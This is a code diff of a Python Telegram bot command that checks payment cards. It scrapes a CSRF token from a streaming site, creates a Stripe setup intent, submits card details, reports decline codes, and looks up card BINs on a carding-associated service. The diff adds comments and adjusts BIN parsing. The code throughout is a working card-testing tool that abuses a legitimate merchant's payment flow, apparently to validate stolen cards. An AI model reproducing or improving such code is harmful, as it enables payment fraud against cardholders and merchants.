@@ -40,6 +40,7 @@ async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     start_time = time.time()
 
     try:
+        # CSRF token
         r1 = requests.get("https://urbanflixtv.com/account/purchases/payment_methods", headers=HEADERS)
         soup = BeautifulSoup(r1.text, "html.parser")
         meta_tag = soup.find("meta", {"name": "csrf-token"})
@@ -48,11 +49,13 @@ async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         token = meta_tag["content"]
 
+        # Setup Intent
         r2 = requests.get("https://urbanflixtv.com/api/billings/setup_intent?page=payment_methods&currency=usd", headers=HEADERS)
         json2 = r2.json()
         setid = json2["setup_intent"]
         setin = setid.split("_secret_")[0]
 
+        # Gửi thẻ
         payload = {
             "return_url": "https://urbanflixtv.com/account/purchases/payment_methods/async_method_setup",
             "payment_method_data[type]": "card",
@@ -82,6 +85,7 @@ async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
         status = j3.get("status", "UNKNOWN")
         decline = j3.get("error", {}).get("decline_code", "NONE")
 
+        # BIN lookup
         bin_res = requests.get(f"https://new.checkerccv.tv/bin_lookup.php?bin={bin_code}", headers={
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
             "Accept": "*/*",
@@ -91,9 +95,8 @@ async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
         card = bin_json.get("scheme", "N/A")
         type_ = bin_json.get("type", "N/A")
         brand = bin_json.get("brand", "N/A")
-        alpha2 = bin_json.get("alpha2", "N/A")
-        name = bin_json.get("name", "")
-        bank = name.split(", ")[0] if ", " in name else name
+        alpha2 = bin_json.get("country", {}).get("alpha2", "N/A")
+        bank = bin_json.get("bank", {}).get("name", "N/A")
 
         elapsed = round(time.time() - start_time, 2)
         msg = f"""
